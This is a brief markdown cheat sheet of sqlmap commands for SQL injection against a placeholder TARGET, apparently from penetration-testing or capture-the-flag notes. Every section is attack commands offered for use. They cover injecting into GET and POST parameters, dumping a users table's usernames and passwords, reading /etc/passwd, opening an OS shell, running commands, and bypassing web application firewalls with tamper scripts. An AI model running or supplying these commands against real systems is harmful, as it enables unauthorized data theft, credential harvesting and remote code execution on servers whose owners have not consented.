# SQLMap

## Basic Usage

```bash
# GET parameter
sqlmap -u "http://TARGET/page.php?id=1" --batch

# POST parameter
sqlmap -u "http://TARGET/login.php" --data "user=admin&pass=test" --batch

# From Burp saved request (most reliable)
sqlmap -r request.txt --batch

# Test specific parameter only
sqlmap -u "http://TARGET/page.php?id=1&cat=2" -p id --batch
```

## Data Extraction

```bash
sqlmap -r request.txt --batch --dbs                              # list databases
sqlmap -r request.txt --batch -D dbname --tables                 # list tables
sqlmap -r request.txt --batch -D dbname -T users --columns       # list columns
sqlmap -r request.txt --batch -D dbname -T users --dump          # dump table
sqlmap -r request.txt --batch -D dbname -T users -C user,pass --dump  # specific columns
```

## Advanced

```bash
sqlmap -r request.txt --batch --file-read="/etc/passwd"          # read files
sqlmap -r request.txt --batch --os-shell                         # interactive shell
sqlmap -r request.txt --batch --os-cmd="whoami"                  # single command
sqlmap -r request.txt --batch --level=3 --risk=2                 # more thorough
sqlmap -r request.txt --batch --cookie="session=abc"             # with cookies
sqlmap -r request.txt --batch --dbms=mysql                       # specify DB type
sqlmap -r request.txt --batch --threads=10                       # faster
sqlmap -r request.txt --batch --random-agent                     # bypass WAF
sqlmap -r request.txt --batch --tamper=space2comment             # WAF bypass scripts
```
